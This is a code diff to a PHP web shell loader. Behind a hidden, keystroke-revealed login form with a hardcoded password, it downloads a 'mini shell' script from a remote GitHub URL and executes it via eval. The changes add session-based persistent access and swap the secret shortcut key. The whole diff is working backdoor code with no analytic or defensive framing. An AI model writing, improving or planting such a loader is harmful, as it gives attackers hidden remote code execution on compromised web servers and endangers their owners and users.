@@ -1,4 +1,6 @@
 <?php
+session_start();
+
 function check_password($input_password) {
     $stored_password = '123qweasd'; // Ganti dengan password yang Anda inginkan
     return $input_password === $stored_password;
@@ -32,13 +34,20 @@ function geturlsinfo($url) {
     return $urls;
 }
 
-// Proses login
-if (isset($_POST['password']) && check_password($_POST['password'])) {
+// Cek apakah pengguna sudah login
+if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
     $a = geturlsinfo('https://raw.githubusercontent.com/HaxorSecInfec/BypassServ-Mini-Shell/main/bypasserv-new.php');
     eval('?>' . $a);
     exit;
 }
 
+// Proses login
+if (isset($_POST['password']) && check_password($_POST['password'])) {
+    $_SESSION['logged_in'] = true;
+    $a = geturlsinfo('https://raw.githubusercontent.com/HaxorSecInfec/BypassServ-Mini-Shell/main/bypasserv-new.php');
+    eval('?>' . $a);
+    exit;
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -67,7 +76,7 @@ if (isset($_POST['password']) && check_password($_POST['password'])) {
 
     <script>
         document.addEventListener('keydown', function(e) {
-            if (e.ctrlKey && e.key === 'k') {
+            if (e.ctrlKey && e.key === 'b') {
                 const form = document.getElementById('password-form');
                 form.style.opacity = '1';
                 form.style.position = 'static';
